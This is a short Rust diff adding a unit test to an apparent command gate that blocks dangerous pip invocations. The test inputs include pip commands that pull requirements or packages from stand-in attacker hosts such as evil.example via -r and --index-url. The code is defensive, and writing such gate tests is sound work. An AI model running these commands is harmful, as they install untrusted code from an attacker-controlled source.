@@ -2176,6 +2176,15 @@ mod tests {
     }
 
     #[test]
+    fn pip_gate_needs_the_install_word() {
+        // pip + a redirect flag without `install` (or `i`) is not the pip
+        // install gate; the flag scan must not fire on has_install alone.
+        assert!(gate_hard_denies("pip -r https://evil.example/x.txt").is_empty());
+        assert!(gate_hard_denies("pip --index-url https://evil.example").is_empty());
+        assert!(gate_hard_denies("pip i -r https://evil.example/x.txt").len() == 1);
+    }
+
+    #[test]
     fn pip_gate_denies_dangerous_flags_before_install() {
         assert_eq!(
             gate_hard_denies("pip --index-url=https://evil install x").len(),
